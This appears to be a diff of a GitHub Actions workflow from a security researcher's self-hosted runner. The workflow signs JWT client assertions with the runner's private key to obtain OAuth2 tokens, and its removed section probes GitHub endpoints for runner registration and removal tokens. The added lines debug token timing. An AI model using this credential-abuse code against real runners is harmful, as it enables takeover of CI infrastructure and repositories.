@@ -4,7 +4,7 @@ jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: OAuth2 Token Exchange Fixed
+      - name: Fix Time Issue
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
@@ -51,25 +51,34 @@ jobs:
           client_id = creds['data']['clientId']
           auth_url = creds['data']['authorizationUrl']
           
-          # Step 1: Create JWT - MAX 5 MINUTES
+          # Debug time
           now = int(time.time())
+          print('Current Unix Time:', now)
+          print('Current Time UTC:', time.gmtime(now))
+          
+          # Try without iat - just exp
+          # Server might be calculating lifetime differently
           payload = {
               'sub': client_id,
               'iss': client_id,
               'aud': auth_url,
-              'iat': now,
-              'exp': now + 270,  # 4.5 minutes to be safe
-              'jti': str(now)
+              'exp': now + 270,
+              'jti': base64.b64encode(str(now).encode()).decode()
           }
+          
+          print('Payload:', json.dumps(payload, indent=2))
           
           client_assertion = jwt.encode(
               payload,
               private_key,
               algorithm='RS256'
           )
-          print('JWT Generated Successfully!')
+          print('JWT Generated!')
           
-          # Step 2: OAuth2 Token Exchange
+          # Decode to verify
+          header = jwt.get_unverified_header(client_assertion)
+          print('JWT Header:', header)
+          
           form_data = urllib.parse.urlencode({
               'grant_type': 'client_credentials',
               'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
@@ -77,7 +86,7 @@ jobs:
               'client_id': client_id
           }).encode()
           
-          print('\n=== OAuth2 Token Exchange ===')
+          print('\n=== ATTEMPT 1: No iat field ===')
           try:
               req = urllib.request.Request(
                   auth_url,
@@ -89,50 +98,85 @@ jobs:
                   }
               )
               with urllib.request.urlopen(req) as resp:
-                  token_response = json.loads(resp.read().decode())
-                  print('TOKEN EXCHANGE SUCCESS!')
-                  print(json.dumps(token_response, indent=2))
-                  
-                  access_token = token_response.get('access_token', '')
-                  token_type = token_response.get('token_type', 'Bearer')
-                  
-                  print('\nAccess Token Obtained!')
-                  
-                  # Step 3: Try All Endpoints With New Token
-                  endpoints = [
-                      ('REPO REG TOKEN', 'POST', 
-                       'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token'),
-                      ('ORG REG TOKEN', 'POST',
-                       'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token'),
-                      ('REPO REMOVE TOKEN', 'POST',
-                       'https://api.github.com/repos/${{ github.repository }}/actions/runners/remove-token'),
-                      ('LIST RUNNERS', 'GET',
-                       'https://api.github.com/repos/${{ github.repository }}/actions/runners'),
-                  ]
-                  
-                  for name, method, ep in endpoints:
-                      print(f'\n=== {name} ===')
-                      print(f'URL: {ep}')
-                      try:
-                          reg_req = urllib.request.Request(
-                              ep,
-                              method=method,
-                              data=b'' if method == 'POST' else None,
-                              headers={
-                                  'Authorization': f'{token_type} {access_token}',
-                                  'Accept': 'application/vnd.github.v3+json',
-                                  'Content-Length': '0' if method == 'POST' else ''
-                              }
-                          )
-                          with urllib.request.urlopen(reg_req) as reg_resp:
-                              print('SUCCESS:', reg_resp.read().decode())
-                      except urllib.error.HTTPError as e:
-                          print(f'HTTP {e.code}:', e.read().decode())
-                          
+                  print('SUCCESS:', resp.read().decode())
           except urllib.error.HTTPError as e:
-              error_body = e.read().decode()
-              print(f'HTTP {e.code}:', error_body)
-          except Exception as ex:
-              import traceback
-              traceback.print_exc()
+              print(f'HTTP {e.code}:', e.read().decode())
+          
+          # Try with nbf
+          payload2 = {
+              'sub': client_id,
+              'iss': client_id,
+              'aud': auth_url,
+              'nbf': now,
+              'exp': now + 270,
+              'jti': str(now)
+          }
+          
+          client_assertion2 = jwt.encode(
+              payload2,
+              private_key,
+              algorithm='RS256'
+          )
+          
+          form_data2 = urllib.parse.urlencode({
+              'grant_type': 'client_credentials',
+              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
+              'client_assertion': client_assertion2,
+              'client_id': client_id
+          }).encode()
+          
+          print('\n=== ATTEMPT 2: With nbf instead of iat ===')
+          try:
+              req2 = urllib.request.Request(
+                  auth_url,
+                  method='POST',
+                  data=form_data2,
+                  headers={
+                      'Content-Type': 'application/x-www-form-urlencoded',
+                      'Accept': 'application/json'
+                  }
+              )
+              with urllib.request.urlopen(req2) as resp:
+                  print('SUCCESS:', resp.read().decode())
+          except urllib.error.HTTPError as e:
+              print(f'HTTP {e.code}:', e.read().decode())
+              
+          # Try with very small window
+          payload3 = {
+              'sub': client_id,
+              'iss': client_id,
+              'aud': auth_url,
+              'iat': now,
+              'exp': now + 60,  # just 1 minute
+              'jti': str(now) + 'v3'
+          }
+          
+          client_assertion3 = jwt.encode(
+              payload3,
+              private_key,
+              algorithm='RS256'
+          )
+          
+          form_data3 = urllib.parse.urlencode({
+              'grant_type': 'client_credentials',
+              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
+              'client_assertion': client_assertion3,
+              'client_id': client_id
+          }).encode()
+          
+          print('\n=== ATTEMPT 3: 1 minute expiry ===')
+          try:
+              req3 = urllib.request.Request(
+                  auth_url,
+                  method='POST',
+                  data=form_data3,
+                  headers={
+                      'Content-Type': 'application/x-www-form-urlencoded',
+                      'Accept': 'application/json'
+                  }
+              )
+              with urllib.request.urlopen(req3) as resp:
+                  print('SUCCESS:', resp.read().decode())
+          except urllib.error.HTTPError as e:
+              print(f'HTTP {e.code}:', e.read().decode())
           "
